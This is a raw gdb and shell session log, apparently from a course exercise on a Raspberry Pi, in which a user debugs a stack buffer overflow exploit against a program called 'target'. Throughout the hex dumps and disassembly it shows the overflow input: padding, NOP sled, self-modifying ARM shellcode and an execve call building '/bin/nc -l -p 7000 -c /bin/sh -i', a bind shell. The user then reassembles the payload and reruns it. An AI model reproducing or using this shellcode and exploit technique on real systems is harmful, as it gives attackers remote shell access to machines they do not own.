0x7efff78c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff79c: 0E 00 00 EA 6C FE FF FF 74 FE FF FF 77 FE FF FF ...¦l¦¦¦t¦¦¦w¦¦¦
0x7efff7ac: 7A FE FF FF 7F FE FF FF 82 FE FF FF 89 FE FF FF z¦¦¦¦¦¦¦¦¦¦¦¦¦
0x7efff7bc: 8D FE FF FF 91 FE FF FF 95 FE FF FF 99 FE FF FF ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
0x7efff7cc: 9D FE FF FF A1 FE FF FF AD FE FF FF A4 00 00 00 ¦¦¦¦¦¦¦¦¦¦¦¦¦...
0x7efff7dc: 0F 40 A0 E1 00 00 A0 E1 00 00 A0 E1 18 70 1F E5 .@¦¦..¦¦..¦¦.p.¦
0x7efff7ec: 07 70 84 E0 B0 30 D7 E1 02 3C 83 E2 B0 30 C7 E1 .p¦¦0¦¦.<¦¦0¦¦
0x7efff7fc: 64 70 1F E5 07 70 84 E0 50 00 1F E5 00 00 84 E0 dp.¦.p¦¦P..¦..¦¦
0x7efff80c: 00 70 80 E5 74 70 1F E5 07 70 84 E0 60 00 1F E5 .p¦¦tp.¦.p¦¦`..¦
0x7efff81c: 00 00 84 E0 00 70 80 E5 84 70 1F E5 07 70 84 E0 ..¦¦.p¦¦p.¦.p¦¦
0x7efff82c: 70 00 1F E5 00 00 84 E0 00 70 80 E5 94 70 1F E5 p..¦..¦¦.p¦¦p.¦
0x7efff83c: 07 70 84 E0 80 00 1F E5 00 00 84 E0 00 70 80 E5 .p¦¦..¦..¦¦.p¦¦
0x7efff84c: A4 70 1F E5 07 70 84 E0 90 00 1F E5 00 00 84 E0 ¦p.¦.p¦¦..¦..¦¦
0x7efff85c: 00 70 80 E5 B4 70 1F E5 07 70 84 E0 A0 00 1F E5 .p¦¦p.¦.p¦¦..¦
0x7efff86c: 00 00 84 E0 00 70 80 E5 C4 00 1F E5 00 00 84 E0 ..¦¦.p¦¦¦..¦..¦¦
0x7efff87c: 00 70 D0 E5 01 70 47 E2 00 70 C0 E5 BC 00 1F E5 .p¦¦.pG¦.p¦¦..¦
0x7efff88c: 00 00 84 E0 F8 00 1F E5 00 00 84 E0 E4 10 1F E5 ..¦¦¦..¦..¦¦¦..¦
0x7efff89c: 01 10 84 E0 6F 70 A0 E3 64 70 47 E2 00 00 00 EF ..¦¦op¦¦dpG¦...¦
0x7efff8ac: 3C 69 6E 74 0A 69 2F 63 73 2F 74 61 72 67 65 74 <int.i/cs/target
0x7efff8bc: 00 58 44 47 5F 53 45 53 53 49 4F 4E 5F 49 44 3D .XDG_SESSION_ID=
0x7efff8cc: 63 34 00 53 48 45 4C 4C 3D 2F 62 69 6E 2F 62 61 c4.SHELL=/bin/ba
0x7efff8dc: 73 68 00 54 45 52 4D 3D 78 74 65 72 6D 00 53 53 sh.TERM=xterm.SS
0x7efff8ec: 48 5F 43 4C 49 45 4E 54 3D 31 39 32 2E 31 36 38 H_CLIENT=192.168
0x7efff8fc: 2E 30 2E 31 30 33 20 36 31 39 38 35 20 32 32 00 .0.103 61985 22.
0x7efff90c: 53 53 48 5F 54 54 59 3D 2F 64 65 76 2F 70 74 73 SSH_TTY=/dev/pts
0x7efff91c: 2F 30 00 55 53 45 52 3D 70 69 00 4C 53 5F 43 4F /0.USER=pi.LS_CO
0x7efff92c: 4C 4F 52 53 3D 72 73 3D 30 3A 64 69 3D 30 31 3B LORS=rs=0:di=01;
0x7efff93c: 33 34 3A 6C 6E 3D 30 31 3B 33 36 3A 6D 68 3D 30 34:ln=01;36:mh=0
0x7efff94c: 30 3A 70 69 3D 34 30 3B 33 33 3A 73 6F 3D 30 31 0:pi=40;33:so=01
0x7efff95c: 3B 33 35 3A 64 6F 3D 30 31 3B 33 35 3A 62 64 3D ;35:do=01;35:bd=
0x7efff96c: 34 30 3B 33 33 3B 30 31 3A 63 64 3D 34 30 3B 33 40;33;01:cd=40;3
0x7efff97c: 33 3B 30 31 3A 6F 72 3D 34 30 3B 33 31 3B 30 31 3;01:or=40;31;01
0x7efff98c: 3A 73 75 3D 33 37 3B 34 31 3A 73 67 3D 33 30 3B :su=37;41:sg=30;
0x7efff99c: 34 33 3A 63 61 3D 33 30 3B 34 31 3A 74 77 3D 33 43:ca=30;41:tw=3
0x7efff9ac: 30 3B 34 32 3A 6F 77 3D 33 34 3B 34 32 3A 73 74 0;42:ow=34;42:st
0x7efff9bc: 3D 33 37 3B 34 34 3A 65 78 3D 30 31 3B 33 32 3A =37;44:ex=01;32:
0x7efff9cc: 2A 2E 74 61 72 3D 30 31 3B 33 31 3A 2A 2E 74 67 *.tar=01;31:*.tg
0x7efff9dc: 7A 3D 30 31 3B 33 31 3A 2A 2E 61 72 63 3D 30 31 z=01;31:*.arc=01
0x7efff9ec: 3B 33 31 3A 2A 2E 61 72 6A 3D 30 31 3B 33 31 3A ;31:*.arj=01;31:
0x7efff9fc: 2A 2E 74 61 7A 3D 30 31 3B 33 31 3A 2A 2E 6C 68 *.taz=01;31:*.lh
0x7efffa0c: 61 3D 30 31 3B 33 31 3A 2A 2E 6C 7A 34 3D 30 31 a=01;31:*.lz4=01
0x7efffa1c: 3B 33 31 3A 2A 2E 6C 7A 68 3D 30 31 3B 33 31 3A ;31:*.lzh=01;31:
0x7efffa2c: 2A 2E 6C 7A 6D 61 3D 30 31 3B 33 31 3A 2A 2E 74 *.lzma=01;31:*.t
0x7efffa3c: 6C 7A 3D 30 31 3B 33 31 3A 2A 2E 74 78 7A 3D 30 lz=01;31:*.txz=0
0x7efffa4c: 31 3B 33 31 3A 2A 2E 74 7A 6F 3D 30 31 3B 33 31 1;31:*.tzo=01;31
0x7efffa5c: 3A 2A 2E 74 37 7A 3D 30 31 3B 33 31 3A 2A 2E 7A :*.t7z=01;31:*.z
0x7efffa6c: 69 70 3D 30 31 3B 33 31 3A 2A 2E 7A 3D 30 31 3B ip=01;31:*.z=01;
0x7efffa7c: 33 31 3A 2A 2E 5A 3D 30 31 3B 33 31 3A 2A 2E 64 31:*.Z=01;31:*.d
0x7efffa8c: 7A 3D 30 31 3B 33 31 3A 2A 2E 67 7A 3D 30 31 3B z=01;31:*.gz=01;
0x7efffa9c: 33 31 3A 2A 2E 31:*.
BBBBBBBBBBBBBBBB¦

Breakpoint 2, f () at target.c:48
48      }
(gdb) info registers
r0             0xa      10
r1             0x0      0
r2             0x1      1
r3             0x0      0
r4             0x0      0
r5             0x0      0
r6             0x10434  66612
r7             0x0      0
r8             0x0      0
r9             0x0      0
r10            0x76fff000       1996484608
r11            0x7efff62c       2130703916
r12            0xa      10
sp             0x7efff5f8       0x7efff5f8
lr             0x76ed0008       1995243528
pc             0x10704  0x10704 <f+424>
cpsr           0x60000010       1610612752
(gdb) stepi
0x00010708      48      }
(gdb) info registers
r0             0xa      10
r1             0x0      0
r2             0x1      1
r3             0x0      0
r4             0x0      0
r5             0x0      0
r6             0x10434  66612
r7             0x0      0
r8             0x0      0
r9             0x0      0
r10            0x76fff000       1996484608
r11            0x7efff62c       2130703916
r12            0xa      10
sp             0x7efff628       0x7efff628
lr             0x76ed0008       1995243528
pc             0x10708  0x10708 <f+428>
cpsr           0x60000010       1610612752
(gdb) stepi
0x7efff700 in ?? ()
(gdb) b *0x7efff79c
Breakpoint 4 at 0x7efff79c
(gdb) stepi
0x7efff704 in ?? ()
(gdb) c
Continuing.

Breakpoint 4, 0x7efff79c in ?? ()
(gdb) x /16i 0x7efff79c
=> 0x7efff79c:  b       0x7efff7dc
   0x7efff7a0:                  ; <UNDEFINED> instruction: 0xfffffe6c
   0x7efff7a4:                  ; <UNDEFINED> instruction: 0xfffffe74
   0x7efff7a8:                  ; <UNDEFINED> instruction: 0xfffffe77
   0x7efff7ac:                  ; <UNDEFINED> instruction: 0xfffffe7a
   0x7efff7b0:                  ; <UNDEFINED> instruction: 0xfffffe7f
   0x7efff7b4:                  ; <UNDEFINED> instruction: 0xfffffe82
   0x7efff7b8:                  ; <UNDEFINED> instruction: 0xfffffe89
   0x7efff7bc:                  ; <UNDEFINED> instruction: 0xfffffe8d
   0x7efff7c0:                  ; <UNDEFINED> instruction: 0xfffffe91
   0x7efff7c4:                  ; <UNDEFINED> instruction: 0xfffffe95
   0x7efff7c8:                  ; <UNDEFINED> instruction: 0xfffffe99
   0x7efff7cc:                  ; <UNDEFINED> instruction: 0xfffffe9d
   0x7efff7d0:                  ; <UNDEFINED> instruction: 0xfffffea1
   0x7efff7d4:                  ; <UNDEFINED> instruction: 0xfffffead
   0x7efff7d8:  andeq   r0, r0, r4, lsr #1
(gdb) stepi
0x7efff7dc in ?? ()
(gdb) x /16i $pc
=> 0x7efff7dc:  mov     r4, pc
   0x7efff7e0:  nop                     ; (mov r0, r0)
   0x7efff7e4:  nop                     ; (mov r0, r0)
   0x7efff7e8:  ldr     r7, [pc, #-24]  ; 0x7efff7d8
   0x7efff7ec:  add     r7, r4, r7
   0x7efff7f0:  ldrh    r3, [r7]
   0x7efff7f4:  add     r3, r3, #512    ; 0x200
   0x7efff7f8:  strh    r3, [r7]
   0x7efff7fc:  ldr     r7, [pc, #-100] ; 0x7efff7a0
   0x7efff800:  add     r7, r4, r7
   0x7efff804:  ldr     r0, [pc, #-80]  ; 0x7efff7bc
   0x7efff808:  add     r0, r4, r0
   0x7efff80c:  str     r7, [r0]
   0x7efff810:  ldr     r7, [pc, #-116] ; 0x7efff7a4
   0x7efff814:  add     r7, r4, r7
   0x7efff818:  ldr     r0, [pc, #-96]  ; 0x7efff7c0
(gdb) info registers r4
r4             0x0      0
(gdb) stepi
0x7efff7e0 in ?? ()
(gdb) info registers r4
r4             0x7efff7e4       2130704356
(gdb) info registers
r0             0xa      10
r1             0x0      0
r2             0x1      1
r3             0x0      0
r4             0x7efff7e4       2130704356
r5             0x0      0
r6             0x10434  66612
r7             0x0      0
r8             0x0      0
r9             0x0      0
r10            0x76fff000       1996484608
r11            0x7efff700       2130704128
r12            0xa      10
sp             0x7efff630       0x7efff630
lr             0x76ed0008       1995243528
pc             0x7efff7e0       0x7efff7e0
cpsr           0x60000010       1610612752
(gdb) stepi
0x7efff7e4 in ?? ()
(gdb) info registers r7
r7             0x0      0
(gdb) stepi
0x7efff7e8 in ?? ()
(gdb) info registers r7
r7             0x0      0
(gdb) stepi
0x7efff7ec in ?? ()
(gdb) info registers r7
r7             0xa4     164
(gdb) x /16i $pc
=> 0x7efff7ec:  add     r7, r4, r7
   0x7efff7f0:  ldrh    r3, [r7]
   0x7efff7f4:  add     r3, r3, #512    ; 0x200
   0x7efff7f8:  strh    r3, [r7]
   0x7efff7fc:  ldr     r7, [pc, #-100] ; 0x7efff7a0
   0x7efff800:  add     r7, r4, r7
   0x7efff804:  ldr     r0, [pc, #-80]  ; 0x7efff7bc
   0x7efff808:  add     r0, r4, r0
   0x7efff80c:  str     r7, [r0]
   0x7efff810:  ldr     r7, [pc, #-116] ; 0x7efff7a4
   0x7efff814:  add     r7, r4, r7
   0x7efff818:  ldr     r0, [pc, #-96]  ; 0x7efff7c0
   0x7efff81c:  add     r0, r4, r0
   0x7efff820:  str     r7, [r0]
   0x7efff824:  ldr     r7, [pc, #-132] ; 0x7efff7a8
   0x7efff828:  add     r7, r4, r7
(gdb) stepi
0x7efff7f0 in ?? ()
(gdb) info registers r7
r7             0x7efff888       2130704520
(gdb) set $r7=0x7efff88c
(gdb) print $r7
$1 = 2130704524
(gdb) info registers r7
r7             0x7efff88c       2130704524
(gdb) x /i 0x7efff88c
   0x7efff88c:  add     r0, r4, r0
(gdb) stepi
0x7efff7f4 in ?? ()
(gdb) info registers
r0             0xa      10
r1             0x0      0
r2             0x1      1
r3             0x0      0
r4             0x7efff7e4       2130704356
r5             0x0      0
r6             0x10434  66612
r7             0x7efff88c       2130704524
r8             0x0      0
r9             0x0      0
r10            0x76fff000       1996484608
r11            0x7efff700       2130704128
r12            0xa      10
sp             0x7efff630       0x7efff630
lr             0x76ed0008       1995243528
pc             0x7efff7f4       0x7efff7f4
cpsr           0x60000010       1610612752
(gdb) stepi
0x7efff7f8 in ?? ()
(gdb) info registers r3
r3             0x200    512
(gdb) stepi
0x7efff7fc in ?? ()
(gdb) x /i 0x7efff88c
   0x7efff88c:  add     r0, r4, r0, lsl #4
(gdb) x /x 0x7efff88c
0x7efff88c:     0xe0840200
(gdb) set *(unsigned char *)0x7efff88d = 0x20
(gdb) x /i 0x7efff88c
   0x7efff88c:  add     r2, r4, r0
(gdb) x /x 0x7efff88c
0x7efff88c:     0xe0842000
(gdb) stepi
0x7efff800 in ?? ()
(gdb) stepi
0x7efff804 in ?? ()
(gdb) x /16i $pc
=> 0x7efff804:  ldr     r0, [pc, #-80]  ; 0x7efff7bc
   0x7efff808:  add     r0, r4, r0
   0x7efff80c:  str     r7, [r0]
   0x7efff810:  ldr     r7, [pc, #-116] ; 0x7efff7a4
   0x7efff814:  add     r7, r4, r7
   0x7efff818:  ldr     r0, [pc, #-96]  ; 0x7efff7c0
   0x7efff81c:  add     r0, r4, r0
   0x7efff820:  str     r7, [r0]
   0x7efff824:  ldr     r7, [pc, #-132] ; 0x7efff7a8
   0x7efff828:  add     r7, r4, r7
   0x7efff82c:  ldr     r0, [pc, #-112] ; 0x7efff7c4
   0x7efff830:  add     r0, r4, r0
   0x7efff834:  str     r7, [r0]
   0x7efff838:  ldr     r7, [pc, #-148] ; 0x7efff7ac
   0x7efff83c:  add     r7, r4, r7
   0x7efff840:  ldr     r0, [pc, #-128] ; 0x7efff7c8
(gdb) stepi
0x7efff808 in ?? ()
(gdb) info registers r0
r0             0xfffffe8d       4294966925
(gdb) stepi
0x7efff80c in ?? ()
(gdb) info registers r0
r0             0x7efff671       2130703985
(gdb) info registers r7
r7             0x7efff650       2130703952
(gdb) stepi
0x7efff810 in ?? ()
(gdb) stepi
0x7efff814 in ?? ()
(gdb) stepi
0x7efff818 in ?? ()
(gdb) stepi
0x7efff81c in ?? ()
(gdb) stepi
0x7efff820 in ?? ()
(gdb) info registers r0
r0             0x7efff675       2130703989
(gdb) info registers r7
r7             0x7efff658       2130703960
(gdb) x /16i $pc
=> 0x7efff820:  str     r7, [r0]
   0x7efff824:  ldr     r7, [pc, #-132] ; 0x7efff7a8
   0x7efff828:  add     r7, r4, r7
   0x7efff82c:  ldr     r0, [pc, #-112] ; 0x7efff7c4
   0x7efff830:  add     r0, r4, r0
   0x7efff834:  str     r7, [r0]
   0x7efff838:  ldr     r7, [pc, #-148] ; 0x7efff7ac
   0x7efff83c:  add     r7, r4, r7
   0x7efff840:  ldr     r0, [pc, #-128] ; 0x7efff7c8
   0x7efff844:  add     r0, r4, r0
   0x7efff848:  str     r7, [r0]
   0x7efff84c:  ldr     r7, [pc, #-164] ; 0x7efff7b0
   0x7efff850:  add     r7, r4, r7
   0x7efff854:  ldr     r0, [pc, #-144] ; 0x7efff7cc
   0x7efff858:  add     r0, r4, r0
   0x7efff85c:  str     r7, [r0]
(gdb)
   0x7efff860:  ldr     r7, [pc, #-180] ; 0x7efff7b4
   0x7efff864:  add     r7, r4, r7
   0x7efff868:  ldr     r0, [pc, #-160] ; 0x7efff7d0
   0x7efff86c:  add     r0, r4, r0
   0x7efff870:  str     r7, [r0]
   0x7efff874:  ldr     r0, [pc, #-196] ; 0x7efff7b8
   0x7efff878:  add     r0, r4, r0
   0x7efff87c:  ldrb    r7, [r0]
   0x7efff880:  sub     r7, r7, #1
   0x7efff884:  strb    r7, [r0]
   0x7efff888:  ldr     r0, [pc, #-188] ; 0x7efff7d4
   0x7efff88c:  add     r2, r4, r0
   0x7efff890:  ldr     r0, [pc, #-248] ; 0x7efff7a0
   0x7efff894:  add     r0, r4, r0
   0x7efff898:  ldr     r1, [pc, #-228] ; 0x7efff7bc
   0x7efff89c:  add     r1, r4, r1
(gdb)
   0x7efff8a0:  mov     r7, #111        ; 0x6f
   0x7efff8a4:  sub     r7, r7, #100    ; 0x64
   0x7efff8a8:  svc     0x00000000
   0x7efff8ac:  strbtvc r6, [lr], #-2364        ; 0x93c
   0x7efff8b0:  teqvs   pc, #163840     ; 0x28000
   0x7efff8b4:  cmnvs   r4, r3, ror pc
   0x7efff8b8:  strbtvc r6, [r5], #-1906        ; 0x772
   0x7efff8bc:  strbmi  r5, [r4, -r0, lsl #16]
   0x7efff8c0:  movtpl  r5, #21343      ; 0x535f
   0x7efff8c4:  mcrmi   9, 2, r4, cr15, cr3, {2}
   0x7efff8c8:  stclcc  9, cr4, [r4, #-380]     ; 0xfffffe84
   0x7efff8cc:  movwpl  r3, #1123       ; 0x463
   0x7efff8d0:  cfstr64mi       mvdx4, [r12], {72}      ; 0x48
   0x7efff8d4:  stmdbvs r2!, {r0, r2, r3, r4, r5, r8, r9, r10, r11, sp}^
   0x7efff8d8:  cmnvs   r2, lr, ror #30
   0x7efff8dc:  strpl   r6, [r0], #-2163        ; 0x873
(gdb) b *0x7efff8a8
Breakpoint 5 at 0x7efff8a8
(gdb) c
Continuing.

Breakpoint 5, 0x7efff8a8 in ?? ()
(gdb) info registers
r0             0x7efff650       2130703952
r1             0x7efff671       2130703985
r2             0x7efff691       2130704017
r3             0x200    512
r4             0x7efff7e4       2130704356
r5             0x0      0
r6             0x10434  66612
r7             0xb      11
r8             0x0      0
r9             0x0      0
r10            0x76fff000       1996484608
r11            0x7efff700       2130704128
r12            0xa      10
sp             0x7efff630       0x7efff630
lr             0x76ed0008       1995243528
pc             0x7efff8a8       0x7efff8a8
cpsr           0x60000010       1610612752
(gdb) x /32x $r0
0x7efff650:     0x6e69622f      0x00636e2f      0x2d006c2d      0x30370070
0x7efff660:     0x2d003030      0x622f0063      0x732f6e69      0x692d2068
0x7efff670:     0xfff65000      0xfff6587e      0xfff65b7e      0xfff65e7e
0x7efff680:     0xfff6637e      0xfff6667e      0x0000007e      0x766e6500
0x7efff690:     0x0000003e      0x706f6e00      0x0000003e      0xe1a00000
0x7efff6a0:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff6b0:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
0x7efff6c0:     0xe1a00000      0xe1a00000      0xe1a00000      0xe1a00000
(gdb) x /32s $r0
0x7efff650:     "/bin/nc"
0x7efff658:     "-l"
0x7efff65b:     "-p"
0x7efff65e:     "7000"
0x7efff663:     "-c"
0x7efff666:     "/bin/sh -i"
0x7efff671:     "P\366\377~X\366\377~[\366\377~^\366\377~c\366\377~f\366\377~"
0x7efff68a:     ""
0x7efff68b:     ""
0x7efff68c:     ""
0x7efff68d:     "env>"
0x7efff692:     ""
0x7efff693:     ""
0x7efff694:     ""
0x7efff695:     "nop>"
0x7efff69a:     ""
0x7efff69b:     ""
0x7efff69c:     ""
0x7efff69d:     ""
0x7efff69e:     "\240", <incomplete sequence \341>
0x7efff6a1:     ""
0x7efff6a2:     "\240", <incomplete sequence \341>
0x7efff6a5:     ""
0x7efff6a6:     "\240", <incomplete sequence \341>
0x7efff6a9:     ""
0x7efff6aa:     "\240", <incomplete sequence \341>
0x7efff6ad:     ""
0x7efff6ae:     "\240", <incomplete sequence \341>
0x7efff6b1:     ""
0x7efff6b2:     "\240", <incomplete sequence \341>
0x7efff6b5:     ""
0x7efff6b6:     "\240", <incomplete sequence \341>
(gdb) x /16i 0x7efff888
   0x7efff888:  ldr     r0, [pc, #-188] ; 0x7efff7d4
   0x7efff88c:  add     r2, r4, r0
   0x7efff890:  ldr     r0, [pc, #-248] ; 0x7efff7a0
   0x7efff894:  add     r0, r4, r0
   0x7efff898:  ldr     r1, [pc, #-228] ; 0x7efff7bc
   0x7efff89c:  add     r1, r4, r1
   0x7efff8a0:  mov     r7, #111        ; 0x6f
   0x7efff8a4:  sub     r7, r7, #100    ; 0x64
=> 0x7efff8a8:  svc     0x00000000
   0x7efff8ac:  strbtvc r6, [lr], #-2364        ; 0x93c
   0x7efff8b0:  teqvs   pc, #163840     ; 0x28000
   0x7efff8b4:  cmnvs   r4, r3, ror pc
   0x7efff8b8:  strbtvc r6, [r5], #-1906        ; 0x772
   0x7efff8bc:  strbmi  r5, [r4, -r0, lsl #16]
   0x7efff8c0:  movtpl  r5, #21343      ; 0x535f
   0x7efff8c4:  mcrmi   9, 2, r4, cr15, cr3, {2}
(gdb) stepi
process 1382 is executing new program: /bin/nc.openbsd
/bin/nc: invalid option -- 'c'
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
          [-P proxy_username] [-p source_port] [-q seconds] [-s source]
          [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
          [-x proxy_address[:port]] [destination] [port]
[Inferior 1 (process 1382) exited with code 01]
(gdb) quit
pi@raspberrypi3_a0c2:~/cs $ as -defsym fakerp=0x7EFFF700 -o arm.o runshell_arm.S -k
pi@raspberrypi3_a0c2:~/cs $ ./target < exploitarm
7efff62c
input 7EFFF62C>
1173 bytes read
0x7efff62c: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0x7efff63c: 95 04 00 00 00 F7 FF FF 18 00 00 00 00 F7 FF 7E ¦....¦¦¦.....¦¦~
0x7efff64c: 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E .¦¦~.¦¦~.¦¦~.¦¦~
0x7efff65c: 00 F7 FF 7E 00 F7 FF 7E 00 F7 FF 7E 00 00 00 00 .¦¦~.¦¦~.¦¦~....
0x7efff66c: 61 72 67 3E 2F 62 69 6E 2F 6E 63 00 2D 6C 00 2D arg>/bin/nc.-l.-
0x7efff67c: 70 00 37 30 30 30 00 2D 63 00 2F 62 69 6E 2F 73 p.7000.-c./bin/s
0x7efff68c: 68 21 2D 69 00 00 00 00 00 00 00 00 00 00 00 00 h!-i............
0x7efff69c: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
0x7efff6ac: 00 00 00 00 00 00 00 00 00 00 00 00 65 6E 76 3E ............env>
0x7efff6bc: 00 00 00 00 6E 6F 70 3E 00 00 00 00 00 00 00 00 ....nop>........
0x7efff6cc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6dc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6ec: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff6fc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff70c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff71c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff72c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff73c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff74c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff75c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff76c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff77c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff78c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff79c: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff7ac: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff7bc: 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 00 00 A0 E1 ..¦¦..¦¦..¦¦..¦¦
0x7efff7cc: 0E 00 00 EA 5C FE FF FF 64 FE FF FF 67 FE FF FF ...¦\¦¦¦d¦¦¦g¦¦¦
0x7efff7dc: 6A FE FF FF 6F FE FF FF 72 FE FF FF 79 FE FF FF j¦¦¦o¦¦¦r¦¦¦y¦¦¦
0x7efff7ec: 88 FE FF FF 8C FE FF FF 90 FE FF FF 94 FE FF FF ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
0x7efff7fc: 98 FE FF FF 9C FE FF FF A8 FE FF FF A8 00 00 00 ¦¦¦¦¦¦¦¦¦¦¦¦¦...
0x7efff80c: 0F 40 A0 E1 00 00 A0 E1 00 00 A0 E1 18 70 1F E5 .@¦¦..¦¦..¦¦.p.¦
0x7efff81c: 07 70 84 E0 B0 30 D7 E1 02 3A 83 E2 B0 30 C7 E1 .p¦¦0¦¦.:¦¦0¦¦
0x7efff82c: 64 70 1F E5 07 70 84 E0 50 00 1F E5 00 00 84 E0 dp.¦.p¦¦P..¦..¦¦
0x7efff83c: 00 70 80 E5 74 70 1F E5 07 70 84 E0 60 00 1F E5 .p¦¦tp.¦.p¦¦`..¦
0x7efff84c: 00 00 84 E0 00 70 80 E5 84 70 1F E5 07 70 84 E0 ..¦¦.p¦¦p.¦.p¦¦
0x7efff85c: 70 00 1F E5 00 00 84 E0 00 70 80 E5 94 70 1F E5 p..¦..¦¦.p¦¦p.¦
0x7efff86c: 07 70 84 E0 80 00 1F E5 00 00 84 E0 00 70 80 E5 .p¦¦..¦..¦¦.p¦¦
0x7efff87c: A4 70 1F E5 07 70 84 E0 90 00 1F E5 00 00 84 E0 ¦p.¦.p¦¦..¦..¦¦
0x7efff88c: 00 70 80 E5 B4 70 1F E5 07 70 84 E0 A0 00 1F E5 .p¦¦p.¦.p¦¦..¦
0x7efff89c: 00 00 84 E0 00 70 80 E5 C4 00 1F E5 00 00 84 E0 ..¦¦.p¦¦¦..¦..¦¦
0x7efff8ac: 00 70 D0 E5 01 70 47 E2 00 70 C0 E5 BC 00 1F E5 .p¦¦.pG¦.p¦¦..¦
0x7efff8bc: 00 00 84 E0 F8 00 1F E5 00 00 84 E0 E4 10 1F E5 ..¦¦¦..¦..¦¦¦..¦
0x7efff8cc: 01 10 84 E0 6F 70 A0 E3 64 70 47 E2 00 00 00 EF ..¦¦op¦¦dpG¦...¦
0x7efff8dc: 3C 69 6E 74 00 00 54 45 52 4D 3D 78 74 65 72 6D <int..TERM=xterm
0x7efff8ec: 00 53 48 45 4C 4C 3D 2F 62 69 6E 2F 62 61 73 68 .SHELL=/bin/bash
0x7efff8fc: 00 53 53 48 5F 43 4C 49 45 4E 54 3D 31 39 32 2E .SSH_CLIENT=192.
0x7efff90c: 31 36 38 2E 30 2E 31 30 33 20 36 31 39 38 35 20 168.0.103 61985
0x7efff91c: 32 32 00 53 53 48 5F 54 54 59 3D 2F 64 65 76 2F 22.SSH_TTY=/dev/
0x7efff92c: 70 74 73 2F 30 00 55 53 45 52 3D 70 69 00 4C 53 pts/0.USER=pi.LS
0x7efff93c: 5F 43 4F 4C 4F 52 53 3D 72 73 3D 30 3A 64 69 3D _COLORS=rs=0:di=
0x7efff94c: 30 31 3B 33 34 3A 6C 6E 3D 30 31 3B 33 36 3A 6D 01;34:ln=01;36:m
0x7efff95c: 68 3D 30 30 3A 70 69 3D 34 30 3B 33 33 3A 73 6F h=00:pi=40;33:so
0x7efff96c: 3D 30 31 3B 33 35 3A 64 6F 3D 30 31 3B 33 35 3A =01;35:do=01;35:
0x7efff97c: 62 64 3D 34 30 3B 33 33 3B 30 31 3A 63 64 3D 34 bd=40;33;01:cd=4
0x7efff98c: 30 3B 33 33 3B 30 31 3A 6F 72 3D 34 30 3B 33 31 0;33;01:or=40;31
0x7efff99c: 3B 30 31 3A 73 75 3D 33 37 3B 34 31 3A 73 67 3D ;01:su=37;41:sg=
0x7efff9ac: 33 30 3B 34 33 3A 63 61 3D 33 30 3B 34 31 3A 74 30;43:ca=30;41:t
0x7efff9bc: 77 3D 33 30 3B 34 32 3A 6F 77 3D 33 34 3B 34 32 w=30;42:ow=34;42
0x7efff9cc: 3A 73 74 3D 33 37 3B 34 34 3A 65 78 3D 30 31 3B :st=37;44:ex=01;
0x7efff9dc: 33 32 3A 2A 2E 74 61 72 3D 30 31 3B 33 31 3A 2A 32:*.tar=01;31:*
0x7efff9ec: 2E 74 67 7A 3D 30 31 3B 33 31 3A 2A 2E 61 72 63 .tgz=01;31:*.arc
0x7efff9fc: 3D 30 31 3B 33 31 3A 2A 2E 61 72 6A 3D 30 31 3B =01;31:*.arj=01;
0x7efffa0c: 33 31 3A 2A 2E 74 61 7A 3D 30 31 3B 33 31 3A 2A 31:*.taz=01;31:*
0x7efffa1c: 2E 6C 68 61 3D 30 31 3B 33 31 3A 2A 2E 6C 7A 34 .lha=01;31:*.lz4
0x7efffa2c: 3D 30 31 3B 33 31 3A 2A 2E 6C 7A 68 3D 30 31 3B =01;31:*.lzh=01;
0x7efffa3c: 33 31 3A 2A 2E 6C 7A 6D 61 3D 30 31 3B 33 31 3A 31:*.lzma=01;31:
0x7efffa4c: 2A 2E 74 6C 7A 3D 30 31 3B 33 31 3A 2A 2E 74 78 *.tlz=01;31:*.tx
